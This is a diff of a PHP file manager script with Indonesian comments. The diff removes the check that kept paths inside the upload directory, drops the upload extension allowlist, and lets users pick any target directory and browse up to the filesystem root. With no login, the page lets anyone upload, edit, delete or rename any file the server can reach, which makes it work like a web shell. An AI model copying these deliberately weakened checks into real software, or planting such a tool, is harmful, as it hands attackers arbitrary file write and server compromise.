@@ -1,102 +1,98 @@
 <?php
-$uploadDir = __DIR__; // Directory where files are uploaded
+// Direktori awal tempat file diupload
+$uploadDir = __DIR__; 
 
-// Function to validate the directory path to ensure it remains within a safe boundary
-function is_safe_path($path, $base) {
-    $realBase = realpath($base);
-    $realPath = realpath($path);
-    return $realPath && strpos($realPath, $realBase) === 0; // Ensure path is within allowed directory
+// Fungsi untuk memvalidasi jalur agar tetap aman
+function is_safe_path($path) {
+    return realpath($path) !== false; // Pastikan jalur valid
 }
 
-// Function to edit a file
-if (isset($_GET['edit']) && is_file($_GET['edit']) && is_safe_path($_GET['edit'], $uploadDir)) {
+// Fungsi untuk menampilkan izin file dalam format octal
+function getFilePermissions($file) {
+    $permissions = fileperms($file);
+    return substr(sprintf('%o', $permissions), -4);
+}
+
+// Fungsi untuk mengupload file
+if (isset($_FILES['upload'])) {
+    $uploadName = basename($_FILES['upload']['name']); // Ambil nama file asli
+    $uploadTmp = $_FILES['upload']['tmp_name'];
+    $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $uploadDir;
+
+    // Validasi direktori tujuan
+    if (!is_safe_path($targetDir) || !is_dir($targetDir)) {
+        echo "<script>alert('Direktori tujuan tidak valid');</script>";
+    } else {
+        $uploadPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $uploadName;
+
+        if (move_uploaded_file($uploadTmp, $uploadPath)) {
+            echo "<script>alert('File berhasil diupload ke $uploadPath');</script>";
+        } else {
+            echo "<script>alert('Gagal mengupload file');</script>";
+        }
+    }
+}
+
+// Fungsi untuk mengedit file
+if (isset($_GET['edit']) && is_file($_GET['edit']) && is_safe_path($_GET['edit'])) {
     $filePath = $_GET['edit'];
 
     if (isset($_POST['content'])) {
-        // Save the content to the file
         file_put_contents($filePath, $_POST['content']);
-        echo "<script>alert('File has been saved');</script>";
+        echo "<script>alert('File berhasil disimpan');</script>";
     }
 
-    // Display the file editor
     echo '<form method="POST">';
     echo '<textarea name="content" style="width:100%;height:300px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>';
-    echo '<br><input type="submit" value="Save">';
+    echo '<br><input type="submit" value="Simpan">';
     echo '</form>';
     exit;
 }
 
-// Function to upload a file
-if (isset($_FILES['upload'])) {
-    $uploadName = basename($_FILES['upload']['name']); // Get the original file name
-    $uploadTmp = $_FILES['upload']['tmp_name'];
-
-    // Check if a file with the same name already exists, if so, generate a new name
-    $uploadPath = "$uploadDir/$uploadName";
-    if (file_exists($uploadPath)) {
-        $uploadName = time() . '_' . $uploadName; // Add a timestamp to avoid duplication
-        $uploadPath = "$uploadDir/$uploadName";
-    }
-
-    // Define allowed file extensions
-    $allowedExtensions = ['php', 'html', 'txt', 'jpg', 'png', 'jpeg', 'gif'];
-    $fileExtension = strtolower(pathinfo($uploadName, PATHINFO_EXTENSION));
-
-    // Check if the file extension is allowed
-    if (in_array($fileExtension, $allowedExtensions)) {
-        // Save the uploaded file
-        move_uploaded_file($uploadTmp, $uploadPath);
-
-        echo "<script>alert('File uploaded successfully');</script>";
-    } else {
-        echo "<script>alert('File extension not allowed');</script>";
-    }
-}
-
-// Function to delete a file or folder
-if (isset($_GET['delete']) && is_safe_path($_GET['delete'], $uploadDir)) {
+// Fungsi untuk menghapus file atau folder
+if (isset($_GET['delete']) && is_safe_path($_GET['delete'])) {
     $deletePath = $_GET['delete'];
 
     if (is_file($deletePath)) {
-        unlink($deletePath); // Delete the file
-        echo "<script>alert('File deleted successfully');</script>";
+        unlink($deletePath);
+        echo "<script>alert('File berhasil dihapus');</script>";
     } elseif (is_dir($deletePath)) {
-        rmdir($deletePath); // Delete the folder (folder must be empty)
-        echo "<script>alert('Folder deleted successfully');</script>";
+        rmdir($deletePath);
+        echo "<script>alert('Folder berhasil dihapus');</script>";
     }
 }
 
-// Function to rename a file or folder
-if (isset($_GET['rename']) && isset($_POST['newName']) && is_safe_path($_GET['rename'], $uploadDir)) {
+// Fungsi untuk mengganti nama file atau folder
+if (isset($_GET['rename']) && isset($_POST['newName']) && is_safe_path($_GET['rename'])) {
     $oldPath = $_GET['rename'];
     $newName = $_POST['newName'];
     $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
 
     if (rename($oldPath, $newPath)) {
-        echo "<script>alert('File or folder renamed successfully');</script>";
+        echo "<script>alert('Nama file atau folder berhasil diubah');</script>";
     } else {
-        echo "<script>alert('Failed to rename file or folder');</script>";
+        echo "<script>alert('Gagal mengganti nama file atau folder');</script>";
     }
 }
 
-// Function to convert file permissions to octal format
-function getFilePermissions($file) {
-    $permissions = fileperms($file);
+// Fungsi untuk menambah folder
+if (isset($_POST['newFolder'])) {
+    $newFolderName = $_POST['newFolder'];
+    $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $uploadDir;
+    $newFolderPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $newFolderName;
 
-    // If it's a directory, add 040000
-    if (is_dir($file)) {
-        $permissions |= 0x4000;
+    if (!is_dir($newFolderPath)) {
+        if (mkdir($newFolderPath, 0777)) {
+            echo "<script>alert('Folder berhasil dibuat di $newFolderPath');</script>";
+        } else {
+            echo "<script>alert('Gagal membuat folder');</script>";
+        }
+    } else {
+        echo "<script>alert('Folder sudah ada');</script>";
     }
-
-    // Convert permissions to octal format
-    return substr(decoct($permissions), -4);
 }
 
-// Display the file and folder list in the current directory
-$dir = isset($_GET['d']) ? $_GET['d'] : $uploadDir;
-$files = scandir($dir);
-
-// Function to display breadcrumb path like shell pwd
+// Fungsi untuk menampilkan breadcrumb path
 function show_pwd($dir) {
     $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
     $path = '';
@@ -109,48 +105,57 @@ function show_pwd($dir) {
     return rtrim($pwd, ' / ');
 }
 
+// Direktori yang sedang dijelajahi
+$dir = isset($_GET['d']) ? $_GET['d'] : $uploadDir;
+$files = scandir($dir);
+
+echo '<h2>Direktori Saat Ini (PWD)</h2>';
+echo '<p>' . show_pwd($dir) . '</p>';
+
+// Form untuk upload file
 echo '<form method="POST" enctype="multipart/form-data">';
-echo '<input type="file" name="upload">';
+echo 'Pilih File: <input type="file" name="upload"><br>';
+echo 'Direktori Tujuan: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '" style="width: 400px;"><br>';
 echo '<input type="submit" value="Upload">';
 echo '</form>';
 
-echo '<h2>Current Directory (PWD)</h2>';
-echo '<p>' . show_pwd($dir) . '</p>';
+// Form untuk menambah folder
+echo '<form method="POST">';
+echo 'Nama Folder Baru: <input type="text" name="newFolder"><br>';
+echo 'Direktori Tujuan: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '" style="width: 400px;"><br>';
+echo '<input type="submit" value="Buat Folder">';
+echo '</form>';
 
 echo '<ul>';
-if ($dir !== $uploadDir) {
-    // Button to go back to the previous directory
-    echo '<li><a href="?d=' . urlencode(dirname($dir)) . '">.. (Go Back)</a></li>';
+if ($dir !== '/') {
+    // Tombol untuk kembali ke direktori sebelumnya
+    echo '<li><a href="?d=' . urlencode(dirname($dir)) . '">.. (Kembali)</a></li>';
 }
-
-// Button to go back to the root directory (where files are uploaded)
-echo '<li><a href="?d=' . urlencode($uploadDir) . '">Back to Root Directory</a></li>';
 
 foreach ($files as $f) {
     if ($f === '.' || $f === '..') continue;
     $path = realpath("$dir/$f");
 
-    // Display file permissions in octal format
-    $permissions = getFilePermissions($path);
-
+    // Tampilkan file atau folder dengan izin dan tindakan
     if (is_dir($path)) {
         echo "<li>[DIR] <a href='?d=" . urlencode($path) . "'>$f</a> 
-                <a href='?d=" . urlencode($dir) . "&delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete this folder?\");'>[Delete]</a> 
-                <span>Permissions: $permissions</span></li>";
+                <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini?\");'>[Hapus]</a>
+                <span>Permissions: " . getFilePermissions($path) . "</span></li>";
     } else {
-        echo "<li>[FILE] <a href='?d=" . urlencode($dir) . "&edit=" . urlencode($path) . "'>$f</a> 
-                <a href='?d=" . urlencode($dir) . "&delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete this file?\");'>[Delete]</a>
-                <a href='?d=" . urlencode($dir) . "&rename=" . urlencode($path) . "'>[Rename]</a>
-                <span>Permissions: $permissions</span></li>";
+        echo "<li>[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> 
+                <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus file ini?\");'>[Hapus]</a> 
+                <a href='?rename=" . urlencode($path) . "'>[Rename]</a>
+                <span>Permissions: " . getFilePermissions($path) . "</span></li>";
     }
 }
 echo '</ul>';
 
+// Form untuk rename file atau folder
 if (isset($_GET['rename'])) {
     $renamePath = $_GET['rename'];
     echo '<form method="POST">';
-    echo 'New Name: <input type="text" name="newName" value="' . basename($renamePath) . '">';
-    echo '<input type="submit" value="Rename">';
+    echo 'Nama Baru: <input type="text" name="newName" value="' . htmlspecialchars(basename($renamePath)) . '">';
+    echo '<input type="submit" value="Ubah Nama">';
     echo '</form>';
 }
 ?>
